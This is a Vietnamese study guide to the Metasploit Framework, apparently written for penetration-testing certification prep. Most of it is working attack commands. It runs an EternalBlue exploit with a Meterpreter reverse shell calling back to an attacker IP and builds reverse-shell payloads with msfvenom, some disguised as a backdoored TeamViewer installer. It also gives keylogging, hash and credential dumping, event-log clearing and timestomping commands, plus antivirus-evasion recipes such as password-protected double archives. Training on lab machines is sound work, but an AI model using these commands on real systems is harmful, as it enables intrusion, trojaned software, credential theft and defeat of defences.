---
title: "Metasploit Framework — Toàn tập"
date: 2026-04-14 00:00:00 +0700
categories: [HTB_CPTS, Metasploit]
tags: [metasploit, pentest, meterpreter, msfvenom, evasion]
---

## Payloads

> **Payload** là module giúp exploit hoàn thành nhiệm vụ — thường là mở shell trên máy nạn nhân và gửi về cho attacker.
{: .prompt-info}

### 3 Loại Payload

```
Singles  →  Tất cả trong 1 gói (không có dấu / ở giữa)
Stagers  →  Phần nhỏ, thiết lập kết nối trước
Stages   →  Payload thật, tải sau qua Stager (có dấu / ở giữa)
```

| Loại | Ví dụ | Đặc điểm |
|---|---|---|
| **Single** | `windows/shell_bind_tcp` | Ổn định, kích thước lớn |
| **Stager** | `bind_tcp` | Nhỏ gọn, thiết lập kênh |
| **Stage** | `shell` | Tính năng nâng cao, không giới hạn size |

### Staged Payload — Luồng hoạt động

```
Attacker ──[Exploit + Stage0]──► Nạn nhân
         ◄──[Kết nối ngược]────
         ──[Stage1: Shell lớn]──►
         ◄══[Meterpreter/Shell]══  ← Kiểm soát hoàn toàn
```

> **Tại sao dùng Reverse Connection?** Nạn nhân chủ động kết nối ra ngoài → bypass firewall dễ hơn vì outbound traffic ít bị chặn hơn inbound.
{: .prompt-tip}

### Meterpreter Payload

| Đặc điểm | Giải thích |
|---|---|
| 🧠 Chạy trong RAM | Không ghi file lên ổ cứng → khó phát hiện |
| 💉 DLL Injection | Kết nối ổn định, khó bị kill |
| 🔌 Load plugin động | Thêm/bớt chức năng khi đang chạy |
| 🔒 Persistent | Tồn tại qua reboot |

#### Lệnh Meterpreter quan trọng

```bash
# Thông tin hệ thống
getuid          # Quyền hiện tại
sysinfo         # Thông tin OS
getpid          # Process ID hiện tại
ps              # Danh sách process

# Thu thập thông tin
hashdump        # Dump password hash từ SAM
screenshot      # Chụp màn hình
keyscan_start   # Bắt đầu keylogger
keyscan_dump    # Xem keystroke đã capture
keyscan_stop    # Dừng keylogger

# Di chuyển / Điều khiển
shell           # Mở CMD Windows
migrate <PID>   # Chuyển sang process khác
getsystem       # Leo thang lên SYSTEM

# File
download <file> # Tải file về
upload <file>   # Upload file lên
ls / cd / pwd   # Điều hướng file system

# Dọn dẹp dấu vết
clearev         # Xóa event log
timestomp       # Thay đổi metadata file
```

### Tìm kiếm Payload

```bash
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads
set payload 15
```

### Payload phổ biến cho Windows

| Payload | Mô tả |
|---|---|
| `windows/x64/shell_reverse_tcp` | Shell đơn, kết nối ngược |
| `windows/x64/shell/reverse_tcp` | Shell staged |
| `windows/x64/meterpreter/reverse_tcp` | ⭐ Meterpreter staged (phổ biến nhất) |
| `windows/x64/powershell/$` | PowerShell session |
| `windows/x64/vncinject/$` | Điều khiển màn hình VNC |

### Ví dụ thực tế — EternalBlue MS17-010

```bash
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.10.10.40    # IP nạn nhân
set LHOST 10.10.14.15     # IP attacker
run
```

---

## Encoders

> **Encoder** biến đổi (mã hóa) payload nhằm tương thích kiến trúc CPU và hỗ trợ vượt qua Antivirus.
{: .prompt-info}

### Mục đích chính

```
1. Loại bỏ Bad Characters (\x00, null byte...)
2. Thay đổi signature để qua mặt AV (hiệu quả hạn chế)
```

### Shikata Ga Nai (SGN)

> Tên tiếng Nhật: 仕方がない — *"Không thể làm gì được"*

```
Payload gốc
    ↓
XOR với key ngẫu nhiên  ← Key thay đổi mỗi lần (polymorphic)
    ↓
Thêm stub giải mã vào đầu
    ↓
Payload đã encode (trông hoàn toàn khác)
```

> AV hiện đại đã nhận ra SGN. Encode dù 1 hay 10 lần vẫn bị phát hiện ~52-54/69 engines trên VirusTotal.
{: .prompt-warning}

### Sử dụng msfvenom

```bash
# Cú pháp cơ bản
msfvenom -a <arch> --platform <os> \
         -p <payload> \
         LHOST=<IP> LPORT=<port> \
         -e <encoder> \
         -i <số_lần_lặp> \
         -b "<bad_chars>" \
         -f <format> \
         -o <output_file>

# Ví dụ — Encode 1 lần
msfvenom -a x86 --platform windows \
         -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 LPORT=8080 \
         -e x86/shikata_ga_nai \
         -f exe -o TeamViewerInstall.exe
```

### Bảng Encoders

| Encoder | Rank | Ghi chú |
|---|---|---|
| `x86/shikata_ga_nai` | Excellent | Phổ biến nhất, polymorphic XOR |
| `x64/xor_dynamic` | Manual | Dynamic key XOR cho x64 |
| `x86/call4_dword_xor` | Normal | XOR đơn giản |
| `x86/alpha_mixed` | Low | Alphanumeric mixedcase |

> **Kết luận quan trọng:** Chỉ dùng Encoder **KHÔNG ĐỦ** để bypass AV hiện đại. Cần kỹ thuật evasion nâng cao hơn.
{: .prompt-danger}

---

## Databases

> Metasploit dùng **PostgreSQL** để lưu trữ kết quả scan, hosts, credentials, loot... một cách có tổ chức.
{: .prompt-info}

### Thiết lập Database

```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run

# Kiểm tra trong msfconsole
db_status
# → Connected to msf. Connection type: PostgreSQL.
```

### Lệnh Database

| Lệnh | Chức năng |
|---|---|
| `db_status` | Kiểm tra kết nối DB |
| `db_import <file>` | Import kết quả scan (.xml) |
| `db_export -f xml <file>` | Xuất dữ liệu ra file |
| `db_nmap <options> <target>` | Nmap tích hợp, tự lưu vào DB |
| `hosts` | Danh sách host phát hiện được |
| `services` | Danh sách dịch vụ đang chạy |
| `creds` | Credentials đã thu thập |
| `loot` | Chiến lợi phẩm (hash, file...) |
| `vulns` | Danh sách lỗ hổng |
| `workspace` | Quản lý workspace |

### Workspaces

```bash
workspace               # Xem danh sách (* = đang dùng)
workspace -a Target_1   # Tạo workspace mới
workspace Target_1      # Chuyển sang workspace
workspace -d Target_1   # Xóa workspace
workspace -r Old New    # Đổi tên workspace
workspace -D            # Xóa tất cả workspace
```

### Import & Sử dụng Nmap

```bash
db_import Target.xml
db_nmap -sV -sS 10.10.10.8
hosts
services
```

### Quản lý Credentials & Loot

```bash
creds
creds add user:admin password:P@ss
creds add user:admin ntlm:<hash>
creds -t ntlm
creds -p 22,445

loot
loot -t hash
```

> **Workflow tối ưu:** Sau khi scan, dùng `hosts -R` hoặc `services -R` để tự động set RHOSTS cho exploit. Tiết kiệm rất nhiều thời gian khi pentest nhiều máy!
{: .prompt-tip}

---

## Plugins

> **Plugin** là phần mềm bên thứ 3 được tích hợp trực tiếp vào msfconsole, mở rộng chức năng mà không cần thoát ra tool khác.
{: .prompt-info}

### Plugin có sẵn

```bash
ls /usr/share/metasploit-framework/plugins
```

| Plugin | Chức năng |
|---|---|
| `nessus.rb` | Vulnerability scanner Nessus |
| `nexpose.rb` | Vulnerability scanner NexPose |
| `openvas.rb` | Vulnerability scanner OpenVAS |
| `sqlmap.rb` | SQL injection automation |
| `wmap.rb` | Web application scanner |
| `pcap_log.rb` | Ghi lại network traffic |

### Load và dùng Plugin

```bash
load nessus
nessus_help
```

### Cài đặt Plugin mới

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
load pentest
```

### Plugin Meterpreter nổi bật

```bash
# Kiwi (Mimikatz) — Dump credentials Windows
load kiwi
creds_all          # Dump tất cả credentials
lsa_dump_sam       # Dump SAM database
lsa_dump_secrets   # Dump LSA secrets

# Incognito — Token Impersonation
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Admin"
```

---

## Sessions & Jobs

```bash
# Background session
[CTRL] + [Z]
# hoặc
background

# Quản lý session
sessions
sessions -l -v          # Chi tiết
sessions -i 1           # Tương tác với session 1
sessions -c "sysinfo"   # Chạy lệnh trên tất cả session
sessions -u <id>        # Nâng cấp shell → Meterpreter
sessions -K             # Xóa tất cả session

# Jobs
exploit -j              # Chạy như background job
jobs -l
kill <id>
jobs -K
```

---

## MSFVenom

> **MSFVenom = MSFPayload + MSFEncode** — tạo và mã hóa payload trong 1 lệnh duy nhất.
{: .prompt-info}

### Cú pháp đầy đủ

```bash
msfvenom -a <arch> --platform <os> \
         -p <payload> \
         LHOST=<IP> LPORT=<port> \
         -k \
         -x <file_gốc> \
         -e <encoder> \
         -i <lần_lặp> \
         -b "<bad_chars>" \
         -f <format> \
         -o <output>
```

### Format theo loại web server

| Web Server | Format | Extension |
|---|---|---|
| IIS + ASP.NET | `-f aspx` | `.aspx` |
| PHP | `-f php` | `.php` |
| Apache Tomcat | `-f war` | `.war` |
| JSP | `-f jsp` | `.jsp` |
| Windows EXE | `-f exe` | `.exe` |

### Ví dụ — FTP + Web Upload

```bash
# Tạo payload .aspx
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 LPORT=1337 \
         -f aspx > reverse_shell.aspx

# Bắt connection
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run
```

### Nhúng payload vào file hợp lệ

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
    LHOST=10.10.14.2 LPORT=8080 \
    -k \
    -x ~/Downloads/TeamViewer_Setup.exe \
    -e x86/shikata_ga_nai -i 5 \
    -a x86 --platform windows \
    -o ~/Desktop/TeamViewer_Setup.exe
```

### Local Exploit Suggester

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

---

## Firewall & IDS/IPS Evasion

### Cách AV/IDS phát hiện malware

| Phương pháp | Hoạt động |
|---|---|
| **Signature-based** | So sánh file với database chữ ký đã biết |
| **Heuristic/Anomaly** | Phát hiện hành vi bất thường so với baseline |
| **Stateful Protocol** | Kiểm tra protocol có đúng chuẩn không |
| **SOC Monitoring** | Con người theo dõi live traffic 24/7 |

### Kỹ thuật 1 — Backdoored Executable

```bash
msfvenom ... -k -x TeamViewer_Setup.exe ... -o TeamViewer_Setup.exe
```

### Kỹ thuật 2 — Double Archive + Password ⭐

```bash
msfvenom ... -o ~/test.js
rar a ~/test.rar -p ~/test.js && mv test.rar test
rar a test2.rar -p test && mv test2.rar test2
# test2 → 0/49 bị phát hiện ✅
```

### Kỹ thuật 3 — Packers

| Packer | Ghi chú |
|---|---|
| **UPX** | Phổ biến, mã nguồn mở |
| **Themida** | Rất mạnh, thương mại |
| **Enigma Protector** | Mạnh, thương mại |
| **MPRESS** | Nhẹ, miễn phí |

### So sánh hiệu quả

```
Encode SGN x1             → 54/69 bị phát hiện  ❌
Encode SGN x10            → 52/65 bị phát hiện  ❌
Backdoored exe (SGN x5)   → 11/59 bị phát hiện  ⚠️
Double-archive + password  →  0/49 bị phát hiện  ✅
Packer                    → Hiệu quả cao         ✅
Meterpreter AES tunnel    → Bypass network IDS   ✅
```

---

## Bảng lệnh tổng hợp

### MSFconsole

| Lệnh | Mô tả |
|---|---|
| `show exploits` | Xem tất cả exploits |
| `show payloads` | Xem tất cả payloads |
| `search <name>` | Tìm kiếm module |
| `info` | Thông tin module hiện tại |
| `use <name>` | Load module |
| `show options` | Xem tùy chọn |
| `set <option> <value>` | Đặt giá trị |
| `setg <option> <value>` | Đặt giá trị toàn cục |
| `check` | Kiểm tra target có vulnerable không |
| `exploit -j` | Chạy exploit như background job |
| `exploit -z` | Không tương tác sau khi exploit |
| `grep <term> <command>` | Lọc kết quả |

### Meterpreter

| Lệnh | Mô tả |
|---|---|
| `sysinfo` | Thông tin hệ thống |
| `getuid` | User đang chạy |
| `getpid` | Process ID hiện tại |
| `ps` | Danh sách process |
| `migrate <PID>` | Chuyển sang process khác |
| `getsystem` | Leo thang lên SYSTEM |
| `getprivs` | Lấy nhiều privileges nhất có thể |
| `shell` | Mở CMD Windows |
| `hashdump` | Dump SAM database |
| `screenshot` | Chụp màn hình |
| `keyscan_start/dump/stop` | Keylogger |
| `upload / download` | Upload/Download file |
| `clearev` | Xóa event log |
| `timestomp` | Thay đổi metadata file |
| `background` | Đưa session xuống nền |

---

## 🗺️ Workflow tổng quan

```
1. Khởi động DB
   └─ sudo msfdb run

2. Tạo Workspace
   └─ workspace -a <tên_target>

3. Recon / Scan
   └─ db_nmap -sV -sS <target>

4. Xem kết quả
   └─ hosts | services | vulns

5. Chọn Exploit
   └─ search <vuln>
   └─ use <module>

6. Chọn Payload
   └─ grep meterpreter grep reverse_tcp show payloads
   └─ set payload <number>

7. Cấu hình
   └─ show options
   └─ set RHOSTS / LHOST / LPORT

8. Tấn công
   └─ exploit -j

9. Post-Exploitation
   └─ sessions -i <id>
   └─ load kiwi / incognito
   └─ hashdump / creds_all

10. Backup kết quả
    └─ db_export -f xml backup.xml
```

---

## Writing & Importing Modules

### Tìm module trên ExploitDB

```bash
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"
```

### Cách Import module thủ công

```bash
sudo cp ~/Downloads/9861.rb \
    /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

> **Quy tắc đặt tên bắt buộc:**
> - ✅ `nagios3_command_injection.rb` (dùng gạch dưới)
> - ❌ `nagios3-command-injection.rb` (không dùng gạch ngang)
> 
> Sai tên → msfconsole không nhận module!
{: .prompt-warning}

### Cấu trúc Module Ruby

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Tên exploit",
      'Description'    => "Mô tả lỗ hổng",
      'Author'         => ['tên_tác_giả'],
      'References'     => [['CVE', '2021-XXXX']],
      'Platform'       => 'php',
      'DisclosureDate' => "2021-01-01"
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Đường dẫn', '/']),
      OptString.new('USERNAME',  [true, 'Tên đăng nhập']),
      OptPath.new('PASSWORDS',  [true, 'File wordlist',
        File.join(Msf::Config.data_directory, "wordlists", "passwords.txt")])
    ])
  end

  def exploit
    # Logic tấn công ở đây
  end
end
```
